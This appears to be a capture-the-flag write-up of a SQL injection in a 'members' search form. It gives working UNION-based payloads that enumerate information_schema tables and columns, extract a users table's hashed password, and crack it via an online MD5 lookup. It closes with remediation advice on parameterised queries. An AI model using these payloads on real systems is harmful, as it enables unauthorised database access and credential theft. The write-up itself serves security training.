# Member SQL injection

## Vulnerability

* Go to `members` category
* Test form for sql injection and see that all users are returned
```sql
1 or 1=1 -- always true
```
* In the form submit the following which will retrieve database table names
```sql
null union select null,table_name from information_schema.tables
```
* List table `users` (we use the hex value `0x7573657273` since we can't
 use a string) columns
```sql
null union select null,column_name from information_schema.columns where
 table_name=0x7573657273
```
* Select `Commentaire` and `countersign` in `users` table
```sql
null union select Commentaire,countersign from users 
```
* See output
```
Commentaire: ????? ????????????? ?????????
countersign : e083b24a01c483437bcf4a9eea7c1b4d

Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and
 it's good !
countersign : 5ff9d0165b4f92b14994e5c685cdce28
``` 
* Go to https://md5hashing.net/hash/md5/5ff9d0165b4f92b14994e5c685cdce28
* MD5 `5ff9d0165b4f92b14994e5c685cdce28` <-> `FortyTwo`
* `fortytwo` <-> SHA256
 `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
 
## Attack

A SQL injection attack consists of insertion or “injection” of a SQL query via 
the input data from the client to the application. 

## Fix
* Use prepared Statements (with Parameterized Queries)
* Avoid dynamically construct a SQL query. Don't simply concatenate strings
 including user inputs to construct SQL query
* Validate parameters from the client 
 
## Reference
https://portswigger.net/web-security/sql-injection/union-attacks
https://en.wikipedia.org/wiki/Information_schema
https://dev.mysql.com/doc/refman/5.7/en/information-schema-tables-table.html
https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
